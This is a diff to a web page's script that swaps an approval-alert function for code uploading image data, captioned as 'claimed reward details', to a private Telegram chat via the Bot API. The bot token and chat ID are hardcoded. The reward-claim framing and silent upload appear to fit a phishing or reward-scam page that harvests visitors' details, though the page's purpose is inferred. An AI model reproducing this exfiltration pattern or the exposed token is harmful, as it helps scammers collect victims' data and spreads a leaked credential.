@@ -435,10 +435,48 @@
             }
         }
 
-        function sendForApproval() {
-            alert('Your claim has been sent for approval.');
-            window.open('https://t.me/your_telegram_channel', '_blank');
+        function sendToTelegram(imageData) {
+    const botToken = '7239108538:AAHeXQhHXINWCz7gnM6_m3-611BTepRGUJg';
+    const chatId = '-1002170868247';
+    const alertMessageDiv = document.getElementById('alertMessage');
+
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', dataURItoBlob(imageData));
+    formData.append('caption', 'Here are the claimed reward details');
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alertMessageDiv.textContent = 'Image sent successfully!';
+            alertMessageDiv.style.color = 'green';
+        } else {
+            alertMessageDiv.textContent = 'Failed to send image: ' + data.description;
+            alertMessageDiv.style.color = 'red';
         }
+    })
+    .catch(error => {
+        console.error('Error sending image:', error);
+        alertMessageDiv.textContent = 'Error sending image.';
+        alertMessageDiv.style.color = 'red';
+    });
+}
+
+function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
+
     </script>
 </body>
 </html>
